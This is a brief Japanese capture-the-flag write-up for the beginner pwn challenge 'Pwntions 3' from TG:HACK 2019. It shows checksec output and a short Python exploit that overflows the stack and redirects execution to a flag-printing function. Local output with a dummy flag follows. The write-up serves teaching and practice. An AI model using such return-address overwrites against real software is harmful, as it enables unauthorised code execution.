# [pwn 100pts] Pwntions 3 - TG:HACK 2019
32bitで全部無効です。
```
$ checksec -f pwntion3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   87 Symbols     No	0		6	pwntion3
```

これもCのコードが渡されています。
単にスタックオーバーフローがあり、flagを表示する関数があるのでそこへ飛ばします。

```python
from ptrlib import *

elf = ELF("./pwntion3")
sock = Process("./pwntion3")

payload = b'A' * 32
payload += p32(elf.symbol("brew_pwntion")) * 8
sock.sendline(payload)

sock.interactive()
```

簡単ですね。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=29546)
[ptrlib]$ Test banner

Professor maritio_o:
> I've made a function for you, my magnificent students! Do a little brewing and show me what you are good for!

Student: FLAG{Dummy}
FLAG{Dummy}
FLAG{Dummy}
FLAG{Dummy}
FLAG{Dummy}
```

# 感想
pwn初心者向けの問題だと思います。
